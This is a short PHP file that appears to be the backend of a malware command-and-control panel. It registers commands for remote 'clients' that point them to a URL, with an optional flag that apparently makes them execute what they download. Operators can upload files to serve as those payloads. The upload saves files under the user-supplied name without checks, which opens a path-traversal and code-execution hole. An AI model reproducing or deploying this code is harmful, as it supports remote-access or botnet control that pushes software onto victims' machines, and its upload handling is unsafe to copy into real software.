<?php
session_start();
if(!isset($_SESSION['logged'])){echo"<script>window.location.href = 'login.php';</script>";exit();}

include"db.php";


function sendcommand($local,$con){
	
	$url="";
	$id=mysqli_real_escape_string($con,$_GET["id"]);
	if($local===""){$url=mysqli_real_escape_string($con,$_POST["urlup"]);}
	else {$url=$local;}
	$exec=mysqli_real_escape_string($con,$_GET["exec"]);
	$commandtype='5';
	if($exec){$commandtype='6';}
	
	$command=$commandtype.'|'.$url;
	$status=mysqli_query($con,"SELECT * FROM clients where id='$id'");
	if($status==false || mysqli_num_rows($status)<=0){http_response_code(404);echo "error";exit();}


	$status=mysqli_query($con,"INSERT INTO commands VALUES ('$id','$command')");
	if($status==false){http_response_code(403);echo "error inserting command";exit();}
	
	
	exit();
	
	
}


if(isset($_POST["urlup"]) && isset($_GET["id"]) && isset($_GET["exec"]) ){sendcommand("",$con);}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $filename = $_FILES['file']['name'];
        $tmpName = $_FILES['file']['tmp_name'];
        $targetDir = 'uploads/';
        $targetFile = $targetDir . $filename;

        if (move_uploaded_file($tmpName, $targetFile)) {
			
			$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
			$host = $_SERVER['HTTP_HOST'];
			$directory = dirname($_SERVER['PHP_SELF']);
			$baseUrl = $protocol . $host . $directory;
			$fullurl=$baseUrl."/".$targetFile;
			sendcommand($fullurl,$con);
			
            http_response_code(200);
            exit;
        } else {
            http_response_code(500);
            exit;
        }
    } else {
        http_response_code(400);
        exit;
    }
} else {
    http_response_code(405);
    exit;
}
?>
